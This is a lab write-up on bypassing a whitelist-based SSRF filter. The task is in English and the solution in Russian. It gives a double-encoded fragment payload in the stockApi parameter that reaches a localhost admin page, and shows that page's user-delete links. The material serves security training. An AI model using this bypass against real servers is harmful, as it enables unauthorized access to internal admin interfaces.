# SSRF with whitelist-based input filter
EXPERT

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass.

## Решение
Форма проверки наличия товара отправляет запрос:

`stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1`

Декодируя из URL-encoding:

`stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1`

URL с localhost не проходит валидацию: `stockApi=http://localhost/admin`

`"External stock check host must be stock.weliketoshop.net"`


Если закодировать символ "#" в "%2523", парсер фронт-сервера воспримет localhost:80%2523 как пару логин и пароль, где localhost - логин, а "80%2523" - пароль. Обработав этот URL, фронт-сервер раскодирует %2523 в %23 и передаст его в таком виде серверу бэкенда.

`stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin` -> `stockApi=http://localhost:80%23@stock.weliketoshop.net/admin` -> `stockApi=http://localhost:80#@stock.weliketoshop.net/admin`

```
<section>
    <h1>Users</h1>
    <div>
        <span>wiener - </span>
        <a href="/admin/delete?username=wiener">Delete</a>
    </div>
    <div>
        <span>carlos - </span>
        <a href="/admin/delete?username=carlos">Delete</a>
    </div>
</section>
```
